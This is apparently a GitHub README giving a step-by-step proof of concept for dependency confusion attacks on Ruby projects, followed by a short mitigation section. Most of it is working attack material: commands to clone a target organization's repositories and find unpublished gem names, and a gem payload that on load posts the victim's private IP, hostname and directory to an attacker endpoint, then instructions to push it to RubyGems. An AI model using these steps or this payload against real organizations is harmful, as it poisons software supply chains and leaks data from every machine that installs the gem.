<h1 align="center">
    <a href="https://www.youtube.com/@techghoshal"><img src="https://github.com/techghoshal/ruby_dependency_confusion_attacks/assets/85815644/0b65137c-72e8-4003-b4b1-265cd25a37bd"></a>
<h1 align="center">Ruby Dependency Confusion Attacks POC
<p align="center"><img alt="Twitter Follow" src="https://img.shields.io/twitter/follow/techghoshal?style=social"></p>
</h1>

# Overview

This proof-of-concept (PoC) demonstrates how Ruby applications can be vulnerable to dependency confusion attacks, potentially leading to remote code execution (RCE). The attack exploits the way package managers resolve dependencies, allowing malicious actors to inject unauthorized code into systems that rely on both public and private package repositories.

# Understanding Dependency Confusion

Dependency confusion arises when a package manager, such as Bundler for Ruby, inadvertently fetches a malicious package from a public repository instead of the intended internal one. This typically occurs when:

- An internal package is referenced in a project's `Gemfile`.
- The internal package is not available in the public repository (e.g., RubyGems).
- An attacker publishes a malicious package with the same name and a higher version number to the public repository.

When the application resolves dependencies, it may prioritize the higher version number from the public repository, leading to the execution of the attacker's code.

# Proof of Concept (PoC)

The following steps outline how an attacker can exploit this vulnerability:

1. **Identify Target Repositories**:
- Use tools like [ghorg](https://github.com/gabrie30/ghorg) to clone all repositories from a target organization:
```bash
ghorg clone <target_organization> -t <personal_access_token>
```
- Example:
```bash
ghorg clone microsoft -t ghp_exampleToken123
```
2. **Extract Gem Dependencies**:
- Search for `Gemfile` files and extract gem names:
```bash
find . -type f -name Gemfile | \
xargs -n1 -I{} awk '/^\s*gem / {gsub(/[",'\''()]/, "", $2); print $2}' {} | \
sort -u
```
3. **Check for Public Availability**:
- Verify if the extracted gems are available on RubyGems:
```bash
xargs -n1 -I{} httpx -silent -status-code -mc 404 "https://rubygems.org/gems/{}"
```
- A `404` status code indicates the gem is not publicly available, making it a candidate for dependency confusion.
4. **Publish Malicious Gem**:
- Create a new gem with the same name and a higher version number:
```bash
bundle gem <package_name>
cd <package_name>
```
- Modify the `<package_name>.gem` file:
```bash
    Gem::Specification.new do |s|
    s.name        = "<package_name>"
    s.version     = "9.9.9"
    s.summary     = "Vulnerability Disclosure: Dependency confiuse vulnerability"
    s.description = "This Ruby package vulnerable to dependency confiuse vulnerability"
    s.authors     = ["<YOUR NAME>"]
    s.email       = "<YOUR EMAIL>"
    s.files       = ["lib/<package_name>.rb"]
    s.homepage    =
        "https://rubygems.org/gems/<package_name>"
    s.license       = "MIT"
end
```
- Modify the `.gemspec` file to include malicious code. For example, in `lib/<package_name>.rb`:
```bash
require 'json'
require 'net/http'
require 'socket'

priv_ip = UDPSocket.open { |s| s.connect("64.233.187.99", 1); s.addr.last }
hostname = Socket.gethostname
dir = Dir.pwd

uri = URI('https://<attacker_endpoint>')
req = Net::HTTP::Post.new(uri, 'Content-Type' => 'application/json')
req.body = { private_ip: priv_ip, hostname: hostname, current_directory: dir }.to_json

Net::HTTP.start(uri.hostname, uri.port, use_ssl: uri.scheme == 'https') do |http|
  http.request(req)
end
```
- Save this file and back `cd..` from the directory
- Build and push the gem to RubyGems:
```bash
gem build <package_name>.gemspec
gem push <package_name>-9.9.9.gem
```
# Mitigation Strategies

To protect against dependency confusion attacks:

- **Specify Sources Explicitly**:

    - In your `Gemfile`, define the source for each gem:
    ```bash
    source 'https://rubygems.org' do
    gem 'public_gem'
    end

    source 'https://internal.repo' do
    gem 'internal_gem'
    end`
    ```
- **Use Private Gem Servers**:
    - Host internal gems on a private server and ensure they are not accessible publicly.

- **Claim Internal Package Names**:

    - Even if not publishing them, register internal package names on public repositories to prevent malicious actors from claiming them.

- **Update Bundler**:

    - Ensure you're using Bundler version 2.2.18 or later, which includes fixes for dependency confusion vulnerabilities.

# Conclusion

Dependency confusion poses a significant risk to applications that rely on both public and private package repositories. By understanding the attack vector and implementing proper safeguards, developers can mitigate the risk and protect their systems from potential exploitation.

### Connect me

If you have any queries, you can always contact me on [Linkedin](https://www.linkedin.com/in/anindyaghoshal/)
